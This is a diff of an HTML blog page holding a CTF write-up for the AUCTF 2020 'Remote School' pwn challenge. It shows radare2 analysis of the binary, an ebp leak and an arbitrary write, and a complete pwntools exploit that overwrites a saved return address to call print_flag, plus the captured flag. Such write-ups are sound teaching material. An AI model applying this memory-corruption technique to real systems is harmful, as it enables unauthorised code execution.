@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head>
-         
+        
+
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <title>AUCTF 2020 Writeup - Remote School</title>
@@ -39,13 +40,21 @@
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  
 
-
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-
-     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 
-
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/java.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js"></script>
+    
     <script>hljs.initHighlightingOnLoad();</script>
-
 
 
 
@@ -59,39 +68,33 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.55.6" />
+ <meta name="generator" content="Hugo 0.72.0" />
         
 
         
 
         
+            <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
         
-        <script type="text/javascript" async
-          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-        </script>
+
         
+
     </head>
 
     <body>
-         
+        
+
         <nav class="navbar navbar-default navbar-fixed-top">
-
             <div class="container">
-
                 <div class="navbar-header">
-
                     <a class="navbar-brand visible-xs" href="#">AUCTF 2020 Writeup - Remote School</a>
-
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-
                 </div>
-
                 <div class="collapse navbar-collapse">
-
                     
                         <ul class="nav navbar-nav">
                             
@@ -107,7 +110,6 @@
                             
                         </ul>
                     
-
                     
                         <ul class="nav navbar-nav navbar-right">
                             
@@ -117,267 +119,207 @@
                             
                                 <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                                <li class="navbar-icon"><a href="/key.asc"><i class="fa fa-key"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
                             
                         </ul>
                     
-
                 </div>
-
             </div>
-
         </nav>
 
 
 <main>
 
-    <div class="item">
+    <div>
+        <h2>AUCTF 2020 Writeup - Remote School</h2>
+        <h5>April 20, 2020</h5>
+        
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
 
-    
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
 
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
 
-    <h4><a href="/post/remote-school-auctf2020/">AUCTF 2020 Writeup - Remote School</a></h4>
-    <h5>April 20, 2020</h5>
-    
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
 
-</div>
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
 
 
-    <br> <div class="text-justify">
+    </div>
 
-<h1 id="intro">Intro</h1>
-
+    <div align="left" class="content"><h1 id="intro">Intro</h1>
 <p>This is the fourth and last pwn challenge. It was solved 63 times and it was worth 960 points.</p>
-
 <p>Description:</p>
-
 <blockquote>
 <p>Dear Student,</p>
-
-<p>Due to COVID-19 concerns our curriculum will be moving completely to online courses&hellip; I know we haven&rsquo;t even started our school year yet so this may come as a shock. But I promise it won&rsquo;t be too bad! You can login at challenges.auctf.com 30013.</p>
-
+<p>Due to COVID-19 concerns our curriculum will be moving completely to online courses… I know we haven’t even started our school year yet so this may come as a shock. But I promise it won’t be too bad! You can login at challenges.auctf.com 30013.</p>
 <p>Best, Dean of Eon Pillars</p>
 </blockquote>
-
-<p>You could download the binary <a href="/ctf/binary/auctf2020/remote_school">here</a>.</p>
-
-<pre><code class="language-shell">$ sha256sum remote_school
+<p>You could download the binary <a href="/ctf/auctf2020/binary/remote_school">here</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum remote_school
 d0639347713b54603db5f8015fc1015ca911fb10ad9d271c31e9630093054664  remote_school
-</code></pre>
-
-<h1 id="exploitation">Exploitation</h1>
-
+</code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>At the startup the program prints a banner and it asks a name. As usual I tried to find a buffer overflow or a format string vulnerability, without success.</p>
-
 <p>Then it prints a prompt. I also played a bit here, without success.</p>
-
 <p>However the program supports a lot of command:</p>
-
-<pre><code class="language-shell">$ ./remote_school
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./remote_school
 Welcome to your new online class!
 We here, at Eon Pillars, we think Zoom is trash and prefer to have our lessions via command line!
 May I get your name?
 	Name: name
 Thanks! It is nice to meet you name!
 
-Well enough of that let's start class ... What should we do?
-&gt; [? for menu]: ?
+Well enough of that let<span style="color:#960050;background-color:#1e0010">&#39;</span>s start class ... What should we <span style="color:#66d9ef">do</span>?
+&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: ?
 
 ~~Eon Pillars help menu~~
 
 help: Print help menu
 attend &lt;class&gt;: go to class
-study &lt;class&gt;: study for class
+study &lt;class&gt;: study <span style="color:#66d9ef">for</span> class
 list: list classes
 stats: check stats
 grades: check grades
 quit: Exit Terminal
 
-What should we do?
-&gt; [? for menu]: 
-</code></pre>
-
-<p>So I analyzed the binary with checksec. It has RWX segment and NX disabled. Weird.</p>
-
-<pre><code class="language-shell">$ checksec remote_school
+What should we <span style="color:#66d9ef">do</span>?
+&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: 
+</code></pre></div><p>So I analyzed the binary with checksec. It has RWX segment and NX disabled. Weird.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ checksec remote_school
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX disabled
     PIE:      PIE enabled
     RWX:      Has RWX segments
-</code></pre>
-
-<p>Then I opened with radare2 and I found two promising functions:</p>
-
-<pre><code class="language-shell">$ r2 -Ad ./remote_school
-[r2]&gt; afl
+</code></pre></div><p>Then I opened with radare2 and I found two promising functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ r2 -Ad ./remote_school
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 .....
-0x5655699f    1 120          sym.class_hacker
-0x56556299    3 144          sym.print_flag
+0x5655699f    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">120</span>          sym.class_hacker
+0x56556299    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">144</span>          sym.print_flag
 .....
-</code></pre>
-
-<p>But there isn&rsquo;t any xref to both functions.</p>
-
+</code></pre></div><p>But there isn’t any xref to both functions.</p>
 <p>However, after some digging, I found an interesting object:</p>
-
-<pre><code class="language-shell">[r2]&gt; is
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; is
 .....
-40   0x00002ec0 0x56558ec0 LOCAL  OBJ    32        classtable
+<span style="color:#ae81ff">40</span>   0x00002ec0 0x56558ec0 LOCAL  OBJ    <span style="color:#ae81ff">32</span>        classtable
 .....
-[r2]&gt; pxr 32 @obj.classtable 
-0x56558ec0 0x565570e0  .pUV (.rodata) (Algebra)
-0x56558ec4 0x5655692f  /iUV (.text) sym.class_algebra
-0x56558ec8 0x565570e8  .pUV (.rodata) (CompSci)
-0x56558ecc 0x56556967  giUV (.text) sym.class_compsci
-0x56558ed0 0x565570f0  .pUV (.rodata) (Hacker)
-0x56558ed4 0x5655699f  .iUV (.text) sym.class_hacker
-0x56558ed8 ..[ null bytes ]..   00000000 
-</code></pre>
-
-<p>It seems like an associative array. So I tried to attend the &ldquo;Hacker&rdquo; class, with success.</p>
-
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pxr <span style="color:#ae81ff">32</span> @obj.classtable 
+0x56558ec0 0x565570e0  .pUV <span style="color:#f92672">(</span>.rodata<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Algebra<span style="color:#f92672">)</span>
+0x56558ec4 0x5655692f  /iUV <span style="color:#f92672">(</span>.text<span style="color:#f92672">)</span> sym.class_algebra
+0x56558ec8 0x565570e8  .pUV <span style="color:#f92672">(</span>.rodata<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>CompSci<span style="color:#f92672">)</span>
+0x56558ecc 0x56556967  giUV <span style="color:#f92672">(</span>.text<span style="color:#f92672">)</span> sym.class_compsci
+0x56558ed0 0x565570f0  .pUV <span style="color:#f92672">(</span>.rodata<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Hacker<span style="color:#f92672">)</span>
+0x56558ed4 0x5655699f  .iUV <span style="color:#f92672">(</span>.text<span style="color:#f92672">)</span> sym.class_hacker
+0x56558ed8 ..<span style="color:#f92672">[</span> null bytes <span style="color:#f92672">]</span>..   <span style="color:#ae81ff">00000000</span> 
+</code></pre></div><p>It seems like an associative array. So I tried to attend the “Hacker” class, with success.</p>
 <p>This class prints a hexadecimal value (maybe an address) and we got a segfault:</p>
-
-<pre><code class="language-shell">&gt; [? for menu]: attend Hacker
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">&gt; <span style="color:#f92672">[</span>? <span style="color:#66d9ef">for</span> menu<span style="color:#f92672">]</span>: attend Hacker
 
 Welcome!
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 0xffff8608
-Segmentation fault (core dumped)
-</code></pre>
-
-<p>Let&rsquo;s disassemble <code>class_hacker</code>.</p>
-
-<p>It&rsquo;s a really simple function. It gets the input and then passes it to another function called <code>test</code>:</p>
-
-<pre><code class="language-shell">[r2]&gt; pdf @sym.class_hacler
+Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</code></pre></div><p>Let’s disassemble <code>class_hacker</code>.</p>
+<p>It’s a really simple function. It gets the input and then passes it to another function called <code>test</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.class_hacler
 .....
-│           0x565569d2      6800200000     push 0x2000
-│           0x565569d7      8d85f8dfffff   lea eax, [var_2008h]
-│           0x565569dd      50             push eax
+│           0x565569d2      <span style="color:#ae81ff">6800200000</span>     push 0x2000
+│           0x565569d7      8d85f8dfffff   lea eax, <span style="color:#f92672">[</span>var_2008h<span style="color:#f92672">]</span>
+│           0x565569dd      <span style="color:#ae81ff">50</span>             push eax
 │           0x565569de      e87df6ffff     call sym.imp.fgets 
 .....
-│           0x56556a02      8d85f8dfffff   lea eax, [var_2008h]
-│           0x56556a08      50             push eax
+│           0x56556a02      8d85f8dfffff   lea eax, <span style="color:#f92672">[</span>var_2008h<span style="color:#f92672">]</span>
+│           0x56556a08      <span style="color:#ae81ff">50</span>             push eax
 │           0x56556a09      e841fbffff     call sym.test
-</code></pre>
-
-<p>The <code>test</code> function is really interesting and it&rsquo;s the target of the exploitation:</p>
-
+</code></pre></div><p>The <code>test</code> function is really interesting and it’s the target of the exploitation:</p>
 <ul>
 <li>It prints the address of <code>ebp</code>. I highlited the line with the THIS comment.</li>
 <li>It gives us an arbitrary write. I also highlited this line with a comment.</li>
 </ul>
-
-<pre><code class="language-shell">[r2]&gt; pdf @sym.test
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.test
 .....
-│           0x56556559      e842fcffff     call sym.__x86.get_pc_thunk.bx
+|           0x56556559      e842fcffff     call sym.__x86.get_pc_thunk.bx
 │           0x5655655e      81c3a22a0000   add ebx, 0x2aa2
-│           0x56556564      55             push ebp
-│           0x56556565      8d83d5e1ffff   lea eax, [ebx - 0x1e2b]
-│           0x5655656b      50             push eax
+│           0x56556564      <span style="color:#ae81ff">55</span>             push ebp
+│           0x56556565      8d83d5e1ffff   lea eax, <span style="color:#f92672">[</span>ebx - 0x1e2b<span style="color:#f92672">]</span>
+│           0x5655656b      <span style="color:#ae81ff">50</span>             push eax
 │           0x5655656c      e82f0e90a1     call 0xf7e573a0             ; THIS
-│           0x56556571      83ec04         sub esp, 4
-│           0x56556574      6808080000     push 0x808                  ; 2056
-│           0x56556579      ff7508         push dword [arg_8h]
-│           0x5655657c      8d85f0f7ffff   lea eax, [var_810h]
-│           0x56556582      50             push eax
+│           0x56556571      83ec04         sub esp, <span style="color:#ae81ff">4</span>
+│           0x56556574      <span style="color:#ae81ff">6808080000</span>     push 0x808                  ; <span style="color:#ae81ff">2056</span>
+│           0x56556579      ff7508         push dword <span style="color:#f92672">[</span>arg_8h<span style="color:#f92672">]</span>
+│           0x5655657c      8d85f0f7ffff   lea eax, <span style="color:#f92672">[</span>var_810h<span style="color:#f92672">]</span>
+│           0x56556582      <span style="color:#ae81ff">50</span>             push eax
 │           0x56556583      e888fbffff     call sym.imp.strncpy
 │           0x56556588      83c410         add esp, 0x10
-│           0x5655658b      8b45f4         mov eax, dword [var_ch]
-│           0x5655658e      8b55f0         mov edx, dword [var_10h]
-│           0x56556591      8910           mov dword [eax], edx        ; ARBITRARY WRITE
+│           0x5655658b      8b45f4         mov eax, dword <span style="color:#f92672">[</span>var_ch<span style="color:#f92672">]</span>
+│           0x5655658e      8b55f0         mov edx, dword <span style="color:#f92672">[</span>var_10h<span style="color:#f92672">]</span>
+│           0x56556591      <span style="color:#ae81ff">8910</span>           mov dword <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>, edx        ; ARBITRARY WRITE
 .....
-</code></pre>
-
-<p>So, with a two step attack, we can overwrite the saved return address (at <code>ebp + 0x4</code>) with the address of <code>print_flag</code>.</p>
-
+</code></pre></div><p>So, with a two step attack, we can overwrite the saved return address (at <code>ebp + 0x4</code>) with the address of <code>print_flag</code>.</p>
 <p>This is the exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 
-<pre><code class="language-python">#!/usr/bin/python2
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/online&#34;</span>, checksec<span style="color:#f92672">=</span>False)
 
-prog = context.binary = ELF(os.getcwd() + &quot;/online&quot;, checksec=False)
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+	host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;challenges.auctf.com&#34;</span>
+	port <span style="color:#f92672">=</span> <span style="color:#ae81ff">30013</span>
+	t <span style="color:#f92672">=</span> remote(host, port)
+<span style="color:#66d9ef">else</span>:
+	t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
 
-if len(sys.argv) &gt; 1:
-	host = &quot;challenges.auctf.com&quot;
-	port = 30013
-	t = remote(host, port)
-else:
-	t = prog.process()
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">2048</span>
+base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x56555000</span>
 
-offset = 2048
-base = 0x56555000
-def init():
-	t.recvuntil(&quot;Name: &quot;)
-	t.sendline(&quot;a_name&quot;)
-	t.recvuntil(&quot;&gt; [? for menu]: &quot;)
-	t.sendline(&quot;attend Hacker&quot;)
-	t.recvuntil(&quot;Welcome!&quot;)
-	payload = &quot;A&quot;*offset
-	payload += &quot;J&quot;*4
-	payload += pack(prog.get_section_by_name(&quot;.data&quot;).header.sh_addr + 0x56556000) # no segfault in this way
-	t.sendline(payload)
-	t.recvuntil(&quot;0x&quot;)
-	leaked = int(&quot;0x&quot; + t.recvuntil(&quot;\n&quot;), 16)
-	return leaked
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>():
+	t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Name: &#34;</span>)
+	t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;a_name&#34;</span>)
+	t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; [? for menu]: &#34;</span>)
+	t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;attend Hacker&#34;</span>)
+	t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Welcome!&#34;</span>)
+	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;J&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+	payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.data&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x56556000</span>) <span style="color:#75715e"># no segfault in this way</span>
+	t<span style="color:#f92672">.</span>sendline(payload)
+	t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;0x&#34;</span>)
+	leaked <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>), <span style="color:#ae81ff">16</span>)
+	<span style="color:#66d9ef">return</span> leaked
 
-def print_flag(ebp):
-	t.recvuntil(&quot;&gt; [? for menu]: &quot;)
-	t.sendline(&quot;attend Hacker&quot;)
-	t.recvuntil(&quot;Welcome!&quot;)
-	payload = &quot;A&quot;*offset
-	payload += pack(prog.symbols[&quot;print_flag&quot;] + base)
-	payload += pack(ebp + 4)
-	t.sendline(payload)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_flag</span>(ebp):
+	t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; [? for menu]: &#34;</span>)
+	t<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;attend Hacker&#34;</span>)
+	t<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Welcome!&#34;</span>)
+	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+	payload <span style="color:#f92672">+=</span> pack(prog<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;print_flag&#34;</span>] <span style="color:#f92672">+</span> base)
+	payload <span style="color:#f92672">+=</span> pack(ebp <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)
+	t<span style="color:#f92672">.</span>sendline(payload)
 
-ebp = init()
-log.info(&quot;ebp @ {:#x}&quot;.format(ebp))
+ebp <span style="color:#f92672">=</span> init()
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ebp @ {:#x}&#34;</span><span style="color:#f92672">.</span>format(ebp))
 print_flag(ebp)
 
-t.interactive()
-t.close()
-</code></pre>
-
-<p>And this is the flag:</p>
-
-<pre><code class="language-shell">$ ./exploit.py
+t<span style="color:#f92672">.</span>interactive()
+t<span style="color:#f92672">.</span>close()
+</code></pre></div><p>And this is the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./exploit.py
 .....
-auctf{1_hope_you_l1ked_my_g@m3_2321}
+auctf<span style="color:#f92672">{</span>1_hope_you_l1ked_my_g@m3_2321<span style="color:#f92672">}</span>
 .....
-</code></pre>
-
-<p><img src="/images/auctf2020/remote_school/solved.png" alt="remote school solved banner" /></p>
+</code></pre></div><p><img src="/ctf/auctf2020/images/remote-school-solved.png" alt="remote school solved banner"></p>
 </div>
 
     
     
-
     
-
         <h4 class="page-header">Related</h4>
-
          <div class="item">
 
     
@@ -390,16 +332,17 @@ auctf{1_hope_you_l1ked_my_g@m3_2321}
     <h4><a href="/post/pick-up-that-can-auctf2020/">AUCTF 2020 Writeup - Pick Up That CAN</a></h4>
     <h5>May 1, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -414,16 +357,19 @@ auctf{1_hope_you_l1ked_my_g@m3_2321}
     <h4><a href="/post/password-cracking-challenges-auctf2020/">AUCTF 2020 Writeup - Password Cracking Challenges</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/hashcat"><kbd class="item-tag">hashcat</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -438,32 +384,34 @@ auctf{1_hope_you_l1ked_my_g@m3_2321}
     <h4><a href="/post/thanksgiving-dinner-auctf2020/">AUCTF 2020 Writeup - Thanksgiving Dinner</a></h4>
     <h5>April 19, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
  
-
     
 
+    
     
 
 </main>
 
         <footer>
-
-            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
-
+            <p class="copyright text-muted">© All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>.</p>
         </footer>
-       
+
+        
+
+        
     </body>
 
 </html>
